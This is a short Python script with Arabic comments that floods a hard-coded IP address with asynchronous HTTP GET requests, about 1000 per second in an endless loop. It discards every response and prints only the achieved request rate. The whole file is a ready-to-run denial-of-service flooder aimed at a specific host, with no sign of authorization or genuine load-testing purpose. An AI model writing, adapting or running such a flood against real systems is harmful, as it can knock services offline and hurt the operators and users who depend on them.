import aiohttp
import asyncio
import time

# الإعدادات
MAX_REQUESTS_PER_SECOND = 1000  # عدد الطلبات في الثانية
URL = "http://198.16.110.165"  # الرابط الجديد
CONCURRENCY = 200  # عدد المهام المتوازية

# دالة لإرسال طلب غير متزامن دون التحقق من الاستجابة
async def send_request(session):
    try:
        # فقط إرسال الطلبات دون انتظار الاستجابة
        async with session.get(URL):
            pass  # لا نحتاج إلى التعامل مع الاستجابة
    except Exception as e:
        print(f"حدث خطأ أثناء إرسال الطلب: {e}")

# دالة لإرسال العديد من الطلبات في وقت واحد
async def send_requests_in_batch():
    async with aiohttp.ClientSession() as session:
        while True:
            start_time = time.time()

            # إرسال 1000 طلب بشكل غير متزامن باستخدام مهام asyncio
            tasks = [send_request(session) for _ in range(MAX_REQUESTS_PER_SECOND)]
            # تنفيذ جميع المهام (الطلبات) في وقت واحد باستخدام asyncio.gather
            await asyncio.gather(*tasks)

            # حساب الوقت الذي تم إنفاقه في إرسال 1000 طلب
            elapsed_time = time.time() - start_time

            # حساب الطلبات في الثانية بناءً على الوقت المنقضي
            requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time

            # طباعة عدد الطلبات في الثانية في سطر واحد
            print(f"\rالطلبات في الثانية: {requests_per_second:.2f}", end="", flush=True)

            # الانتظار لتحقيق الهدف قبل بدء الجولة التالية
            if elapsed_time < 1:
                await asyncio.sleep(1 - elapsed_time)  # الانتظار للحصول على 1 ثانية كاملة

# تشغيل العملية باستخدام asyncio
if __name__ == "__main__":
    asyncio.run(send_requests_in_batch())
